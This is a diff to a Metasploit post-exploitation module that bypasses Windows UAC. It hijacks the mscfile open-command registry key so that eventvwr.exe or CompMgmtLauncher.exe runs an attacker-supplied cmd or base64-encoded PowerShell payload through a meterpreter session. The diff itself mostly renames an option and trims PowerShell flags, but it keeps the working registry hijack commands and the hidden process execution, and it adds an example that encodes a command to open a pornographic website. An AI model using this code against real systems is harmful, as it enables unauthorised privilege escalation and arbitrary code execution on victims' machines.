@@ -39,13 +39,14 @@
 # Check target vulnerability settings/status?  => set CHECK_VULN true
 # Delete malicious registry hive keys/values?  => set DEL_REGKEY true
 # Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
-# The binary.exe vulnerable?                   => set VUL_SOFT CompMgmtLauncher.exe
+# The binary.exe vulnerable?                   => set VULN_SOFT CompMgmtLauncher.exe
 # ---
 # HINT: To deploy a powershell payload (shellcode string) we need to set the option
 # 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
 # EXAMPLE: set USE_POWERSHELL true
 # EXAMPLE: set EXEC_COMMAND ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
 # HINT: echo 'test' > c:\\test.txt -> ENCODED IN BASE64: ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
+# HINT: echo "start chrome.exe www.youporn.com" -> IN BASE64: c3RhcnQgY2hyb21lLmV4ZSB3d3cueW91cG9ybi5jb20K
 # ---
 #
 #
@@ -118,7 +119,7 @@ class MetasploitModule < Msf::Post
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover : enigma0x3 | mattifestation', # credits
+                                        'Vuln discover: enigma0x3 | mattifestation',  # credits
                                 ],
  
                         'Version'        => '$Revision: 1.9',
@@ -143,8 +144,8 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-                                         'SESSION' => '1',            # Default its to run againts session 1
-                                         'VUL_SOFT'=> 'eventvwr.exe', # Default its to run againts eventvwr.exe
+                                         'SESSION' => '1',             # Default its to run againts session 1
+                                         'VULN_SOFT'=> 'eventvwr.exe', # Default its to run againts eventvwr.exe
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -159,7 +160,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptString.new('VUL_SOFT', [ false, 'The binary.exe vulnerable (eg CompMgmtLauncher.exe)']),
+                                OptString.new('VULN_SOFT', [ false, 'The binary.exe vulnerable (eg CompMgmtLauncher.exe)']),
                                 OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
@@ -185,14 +186,12 @@ else
 end
 
   r=''
-  vul_serve = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
-  # vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
+  vul_serve = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
-  psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
-  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
+  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -enc" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -260,7 +259,7 @@ end
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
@@ -358,8 +357,7 @@ def ls_stage3
   r=''
   session = client
   oscheck = client.fs.file.expand_path("%OS%")
-  vuln_soft = datastore['VUL_SOFT'] # vulnerable soft to be hijacked
-  # vuln_soft = "eventvwr.exe" # vulnerable software name
+  vuln_soft = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   vuln_hive = "HKCR\\mscfile\\shell\\open\\command" # vulnerable hive key call (mmc.exe)
   vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
